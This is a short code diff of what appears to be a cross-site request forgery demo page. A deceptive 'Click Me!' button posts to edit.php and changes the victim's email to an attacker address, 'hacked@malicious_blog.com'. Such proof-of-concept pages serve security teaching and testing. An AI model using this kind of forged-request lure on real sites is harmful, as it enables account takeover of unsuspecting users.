@@ -25,6 +25,6 @@
     }
 </script>
 <body>
-    <input type="button" value="Click Me!" onclick="post_to_url('edit.php', {'email':'Hacked!'}, 'post');" />
+    <input type="button" value="Click Me!" onclick="post_to_url('edit.php', {'email':'hacked@malicious_blog.com'}, 'post');" />
 </body>
 </html>
